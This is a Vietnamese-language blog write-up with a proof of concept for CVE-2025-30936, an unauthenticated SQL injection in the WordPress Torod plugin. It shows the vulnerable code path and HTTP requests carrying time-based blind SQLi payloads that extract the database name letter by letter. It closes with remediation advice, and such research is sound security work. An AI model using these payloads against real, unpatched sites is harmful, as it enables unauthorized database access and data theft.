---
title: CVE-2025-30936 Analysis & POC
description: Security Vulnerability in WordPress Torod Plugin.
date: 2025-09-28 20:51:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, sqli]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

Lỗ hổng xảy ra trên plugin **Torod** của WordPress. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.

* **CVE ID**: [CVE-2025-30936](https://www.cve.org/CVERecord?id=CVE-2025-30936)
* **Product**: [WordPress Torod Plugin](https://wordpress.org/plugins/torod/)
* **Vulnerability Type**: SQL Injection
* **Affected Versions**: <= 1.9
* **Fixed in**: <= N/A
* **CVSS severity**:  High (9.3)
* **Required Privilege**: Unauthenticated

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Torod**: v1.9

## Analysis

Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ **POST** request vào SQL query mà không có cơ chế quản kiểm soát chặt chẽ.

### Vulnerable Sink

CVE này không có bản vá nên không thể sử dụng **diff tool** để so sánh sự khác biệt giữa **code lỗi** và **code đã fix lỗi**.

> Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global `$wpdb`, ta search từ khóa này trong thư mục của plugin để tìm sink.

{{< figure src="search_sink.png" caption="Tìm vị trí sink trong code" alt="Search sink" >}}

👉 Dữ liệu từ `$_POST['country_id']` được đưa thẳng vào truy vấn SQL mà không có cơ chế kiểm soát hợp lệ. Việc chỉ sử dụng `sanitize_text_field()` mới dừng lại ở mức **escape chuỗi**, chứ không đảm bảo tính an toàn. Do đó, lỗ hổng SQLi có thể xảy ra.

* Source: `$_POST['country_id']`
* Sink: `$wpdb->get_results("SELECT * FROM $table_name WHERE country_id = $country_id")`

### How it work?

Lỗ hổng nằm trong hàm `get_regions_and_cities` của class `ajaxyk` thuộc file **inc/ajaxyk.php**. Để xác định nơi nó được gọi, ta tìm kiếm với từ khóa `get_regions_and_cities` trong thư mục chứa plugin.

{{< figure src="search_1.png" caption="Tìm vị trí hàm get_regions_and_cities" alt="Search 1" >}}

👉 `get_regions_and_cities` được construct của class `ajaxyk` gọi làm callback của 2 action hook thông qua hàm `add_action`

* `wp_ajax_get_regions_and_cities`

  * Được viết theo cú pháp `wp_ajax_{$action}`
  * Yêu cầu người dùng đăng nhập

* `wp_ajax_nopriv_get_regions_and_cities`

  * Được viết theo cú pháp `wp_ajax_nopriv_{$action}`
  * Không yêu cầu người dùng đăng nhập

Vì đây là lỗ hổng **unauthenticated** nên ta chỉ quan tâm tới hook `wp_ajax_nopriv_get_regions_and_cities`.

Như vậy khi gửi **POST** request đến `/wp-admin/admin-ajax.php` với tham số

```http
action=wp_ajax_nopriv_get_regions_and_cities&country_id=payload_here
```

* Callback `get_regions_and_cities` được gọi.
* `country_id` được lấy trực tiếp từ request và chèn vào SQL query.
* Query thực thi với payload độc hại.

## Exploit

### Detect SQLi

Gửi **POST request** chứa payload SQLi.

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=get_regions_and_cities&country_id=(SELECT 1 FROM (SELECT SLEEP(5))a)
```

Khi đó câu query sẽ trở thành:

```sql
SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a)
```

{{< figure src="time_resp.png" caption="Kết quả phản hồi thời gian" alt="Responsed time" >}}

👉 Dựa trên thời gian phản hồi => payload hoạt động.

**Các technique có thể sử dụng trong trường hợp table rỗng**:

* **UNION**: vì nó không phụ thuộc vào dữ liệu bảng của câu query trước đó, nhưng cần phải tìm được số cột tương ứng.
* **Subquery**:

  * **Subquery trong mệnh đề WHERE**: MySQL có thể tối ưu hóa và bỏ qua subquery nếu kết quả có thể xác định sớm. Nếu bảng không có dữ liệu, kết quả cuối cùng sẽ là tập rỗng, MySQL không cần thực thi `SLEEP()`.
  * **Subquery trong mệnh đề FROM**: Truy vấn con được coi là bảng tạm thời. MySQL phải thực thi truy vấn con này đầu tiên để tạo bảng tạm thời, sau đó mới thực thi truy vấn chính.

{{< figure src="https://www.kdnuggets.com/wp-content/uploads/ferrer_essential_guide_sql_execution_order_6.png" caption="Thứ tự thực thi truy vấn SQL" alt="SQL Excution Order" >}}

### Get First Letter of Database Name

Điều kiện tiên quyết để **dump được hết data** là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.

Gửi request với **SQLi payload**:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
Cookie: cookie_here

action=get_regions_and_cities=1&country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)
```

Sử dụng `SUBSTRING()` để lấy ký tự đầu tiên của **database name**, `IF()` trả về `SLEEP(5)` nếu ký tự đó là `0x77`('w')

Sử dụng hex encoding `w` thành `0x77` vì `country_id` được lấy từ **POST** request trong nên bị escape bởi [magic quotes](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes) trong WordPress và bởi `sanitize_text_field`.

👉 Dựa trên thời gian phản hồi => kí tự đầu tiên đúng là `w`.

## Conclusion

Lỗ hổng **CVE-2025-30936** trong plugin WordPress **Torod** từ phiên bản **1.9** trở lại, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.

Chưa có bản vá chính thực nào cho lỗ hổng này.

**Key takeaways**:

* Kiểm soát kỹ input từ người dùng.
* Luôn sử dụng `$wpdb->prepare()` khi làm việc với database trong WordPress để tránh SQL Injection.
* Thường xuyên cập nhật plugin và kiểm tra bảo mật để tránh trở thành mục tiêu tấn công.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Torod Plugin <= 1.9 is vulnerable to SQL Injection](https://patchstack.com/database/wordpress/plugin/torod/vulnerability/wordpress-torod-1-9-sql-injection-vulnerability?_s_id=cve)
